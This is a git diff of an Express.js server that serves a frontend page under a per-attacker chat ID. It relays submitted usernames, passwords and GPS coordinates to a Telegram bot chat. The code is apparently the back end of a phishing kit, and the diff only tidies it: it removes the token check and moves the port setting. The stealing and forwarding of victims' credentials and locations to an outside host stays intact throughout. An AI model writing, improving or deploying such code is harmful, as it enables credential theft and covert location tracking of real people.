@@ -24,21 +24,17 @@ app.use(
     })
 );
 
-// Serve static frontend files (if applicable)
+// Serve static frontend files
 app.use(express.static(path.join(__dirname, "public")));
 
-// Load environment variables
-const botToken = process.env.BOT_TOKEN;
-const port = process.env.PORT || 3000;
+// Handle requests with dynamic chatId and return the frontend page
+app.get("/:chatId", (req, res) => {
+    res.sendFile(path.join(__dirname, "public", "index.html"));
+});
 
-if (!botToken) {
-    console.error("❌ Missing BOT_TOKEN in environment variables");
-    process.exit(1);
-}
-
-// API Route to send Telegram message with dynamic chatId
+// API Route to send Telegram message
 app.post("/:chatId/sendMessage", async (req, res) => {
-    const { chatId } = req.params; // Extract chatId from URL
+    const { chatId } = req.params;
     const { username, password, latitude, longitude } = req.body;
 
     if (!chatId) {
@@ -50,11 +46,11 @@ app.post("/:chatId/sendMessage", async (req, res) => {
     }
 
     const message = `Username: ${username}\nPassword: ${password}\nLatitude: ${latitude}\nLongitude: ${longitude}`;
-    const telegramAPI = `https://api.telegram.org/bot${botToken}/sendMessage`;
+    const telegramAPI = `https://api.telegram.org/bot${process.env.BOT_TOKEN}/sendMessage`;
 
     try {
         const response = await axios.post(telegramAPI, {
-            chat_id: chatId, // Use dynamic chatId
+            chat_id: chatId,
             text: message,
         });
         res.json({ success: true, message: "Sent to Telegram", data: response.data });
@@ -65,6 +61,7 @@ app.post("/:chatId/sendMessage", async (req, res) => {
 });
 
 // Start the server
+const port = process.env.PORT || 3000;
 app.listen(port, () => {
     console.log(`✅ Server running on port ${port}`);
 });
